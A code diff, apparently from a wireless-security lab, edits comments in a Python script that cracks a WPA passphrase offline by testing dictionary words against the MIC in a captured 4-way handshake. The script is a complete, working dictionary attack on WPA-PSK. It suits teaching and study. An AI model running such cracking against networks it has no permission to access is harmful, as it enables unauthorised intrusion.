@@ -26,6 +26,7 @@ def customPRF512(key, A, B):
 # Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
 wpa = rdpcap("wpa_handshake.cap")
 
+#Get dictionary for testing passPhrase
 with open("dico.txt") as f:
     dico = f.readlines()
 
@@ -39,21 +40,21 @@ Clientmac = a2b_hex(wpa[1].addr1.replace(":", ""))  # MAC address of the client
 ANonce = a2b_hex(b2a_hex(wpa[5].load)[26:90])
 SNonce = a2b_hex(b2a_hex(wpa[6].load)[26:90])
 
-# This is the MIC contained in the 4th frame of the 4-way handshake. I copied it by hand.
-# When trying to crack the WPA passphrase, we will compare it to our own MIC calculated using passphrases from a dictionary
+# This is the MIC contained in the 4th frame of the 4-way handshake.
 mic_to_test = b2a_hex(wpa[8].load)[154:186]
 
 B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                               SNonce)  # used in pseudo-random function
 
-# Take a good look at the contents of this variable. Compare it to the Wireshark last message of the 4-way handshake.
-# In particular, look at the last 16 bytes. Read "Important info" in the lab assignment for explanation
+# data
 data = a2b_hex("%02x" % wpa[8][5].version + "%02x" % wpa[8][5].type + "%04x" % wpa[8][5].len + b2a_hex(
     wpa[8][5].load[:77]).decode().ljust(190, '0'))
 
 i = 0
 while True:
+    #Get one possible passhprase from the dictionary
     passPhrase = dico[i][:-1]
+
     # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
 
@@ -72,6 +73,7 @@ while True:
     # the MIC for the authentication is actually truncated to 16 bytes (32 chars). SHA-1 is 20 bytes long.
     MIC_hex_truncated = mic.hexdigest()[0:32]
 
+    #Control if the mic from the dictionary passphrase is the same the one from the passphrase we try to find
     if MIC_hex_truncated == mic_to_test:
         break;
     i += 1
